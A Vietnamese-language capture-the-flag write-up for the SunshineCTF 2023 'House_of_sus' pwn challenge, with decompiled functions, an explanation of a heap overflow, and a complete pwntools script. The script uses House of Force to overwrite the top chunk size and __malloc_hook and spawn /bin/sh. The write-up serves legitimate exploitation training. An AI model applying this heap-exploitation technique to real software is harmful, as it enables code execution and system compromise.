# House_of_sus (SunshineCTF 2023)

tiếp tục với 1 chall vế kĩ thuật **House of Force** 

## ida 

vì chall khá dài nên ta vừa xem ida vừa phân tích luôn 

### main

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int rounds; // [rsp+1Ch] [rbp-4h]

  printf("\n%s\n", (const char *)sussie);
  printf("%s", (const char *)sussy);
  seed = get_seed();
  srand(seed);
  join_game();
  for ( rounds = 10; rounds; --rounds )
  {
    v3 = display_menu();
    if ( v3 == 3 )
    {
      call_emergency_meeting();
    }
    else
    {
      if ( v3 > 3 )
        goto LABEL_10;
      if ( v3 == 1 )
      {
        do_tasks();
      }
      else
      {
        if ( v3 != 2 )
        {
LABEL_10:
          puts("Nice try... IMPOSTER... sus");
          return 0;
        }
        report();
      }
    }
  }
  return 0;
}
```

### join_game 

```c 
void __cdecl join_game()
{
  char *__ptr; // [rsp+8h] [rbp-8h]

  __ptr = (char *)malloc(8uLL);
  printf("\nWelcome Red, you will be joining game: %p\n", __ptr - 16);
  free(__ptr);
  generate_players();
}
``` 

chà chall cho ta luôn địa chỉ heap 

### do_tasks 

```c 
void __cdecl do_tasks()
{
  int v0; // eax

  v0 = rand();
  printf("\n%s\n", tasks[v0 % 5]);
  tasks_completed[0] = 1;
}
```

option 1 ko có gì đặt biệt, chủ yếu cho tasks_completed[0] = 1 để ta hoàn thành task 

### report
```c 
void __cdecl report()
{
  if ( tasks_completed[0] )
  {
    printf("\nIf you want to game the system before you vote... here's the seed: %lu\n", seed);
    vote();
  }
  else
  {
    puts("\nDo your tasks!");
  }
}
```

ở option 2 ta debug thì thấy seed là địa chỉ libc => leak libc 

### call_emergency_meeting
```c
void __cdecl call_emergency_meeting()
{
  char tmp; // [rsp+7h] [rbp-19h] BYREF
  ulong resp_size; // [rsp+8h] [rbp-18h] BYREF
  char *response; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("\nWhy'd you call an emergency meeting?! I was doing my tasks >:(");
  printf("\nUh oh, you've been called out, how many characters will your response be? ");
  __isoc99_scanf("%lu%c", &resp_size, &tmp);
  printf("Enter your response: ");
  response = (char *)malloc(resp_size);
  fgets(response, 0x40, stdin);
  printf("\nYou responded: %s\n", response);
  vote();
}
```

option 3 cho phép ta nhập size và malloc(), sau đó nhập vào chunk 

nhưng mà khoan đã, để ý thì thấy hàm fgets cho phép ta nhập 0x40byte, giả sử chunk ta có size < 0x40 thì lúc này sẽ có lỗi BOF => ow size Top chunk => HOF

### be_imposter 

```c 
void __cdecl be_imposter(char *file)
{
  char *args[2]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  args[0] = file;
  args[1] = 0LL;
  execve(file, args, 0LL);
}
```
chà ở đây có thêm hàm tạo shell cho mình nè, ta chỉ cần set /bin/sh cho rdi là được

## Exploit 

- trước tiên cứ leak heap vs libc trước  
```python 
p.recvuntil(b'game: ')
heap = int(p.recvline()[:-1], 16)
print(heap)
print(hex(heap))

p.sendlineafter(b'meeting', b'1')
p.sendlineafter(b'meeting', b'2')
p.recvuntil(b'seed: ')
libc_leak = int(p.recvline()[:-1], 10)
libc.address = libc_leak - 0x44390
print(hex(libc.address))
print(hex(libc_leak))
p.sendlineafter(b'(You)', b'1')
```

- dùng HOF để thay size Top chunk thành 0xffffffffffffffff  

```python 
def add(size, data):
    p.sendlineafter(b'meeting', b'3')
    p.sendlineafter(b'>:(', str(size))
    p.sendline(data)
    p.sendlineafter(b'(You)', b'1')

add(0x20, b'a'*40 + p64(0xffffffffffffffff))
``` 

![image](https://github.com/gookoosss/CTF/assets/128712571/59e330b6-f9f9-46dc-848c-8ae0552e7e85)


- có libc rồi nên ý tưởng có mình là ow hook, chọn __malloc_hook 
- áp dụng công thức tính offset mà mình đã research ở chall trước để có offset 
- lần malloc(offset) ta sẽ lưu /bin/sh\0 vào đây  => tạo 1 chunk chứa /bin/sh
- ow __malloc_hook thành hàm be_imposter 
- cuối cùng ta malloc() với size là addr của chunk chứa /bin/sh và lấy shell 

```python 
offset = libc.sym.__malloc_hook - (heap + 0x1070) - 0x8
add(offset, "/bin/sh\0")
add(0x20, p64(exe.sym['be_imposter']))
p.sendlineafter(b'meeting', b'3')
p.sendlineafter(b'>:(', str(heap + 0x1070))
```

![image](https://github.com/gookoosss/CTF/assets/128712571/628b4b44-569f-4f20-91ea-58f8e08581fd)


## script  

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = process([exe.path])
gdb.attach(p, gdbscript = '''
b*0x0000000000401857
c
''')

input()

p.recvuntil(b'game: ')
heap = int(p.recvline()[:-1], 16)
print(heap)
print(hex(heap))

p.sendlineafter(b'meeting', b'1')
p.sendlineafter(b'meeting', b'2')
p.recvuntil(b'seed: ')
libc_leak = int(p.recvline()[:-1], 10)
libc.address = libc_leak - 0x44390
print(hex(libc.address))
print(hex(libc_leak))
p.sendlineafter(b'(You)', b'1')

def add(size, data):
    p.sendlineafter(b'meeting', b'3')
    p.sendlineafter(b'>:(', str(size))
    p.sendline(data)
    p.sendlineafter(b'(You)', b'1')

add(0x20, b'a'*40 + p64(0xffffffffffffffff))
offset = libc.sym.__malloc_hook - (heap + 0x1070) - 0x8
add(offset, "/bin/sh\0")
add(0x20, p64(exe.sym['be_imposter']))
p.sendlineafter(b'meeting', b'3')
p.sendlineafter(b'>:(', str(heap + 0x1070))

p.interactive()

```

## Flag 

sun{4Re_y0U_th3_!mP0st3r_v3rY_su55!}
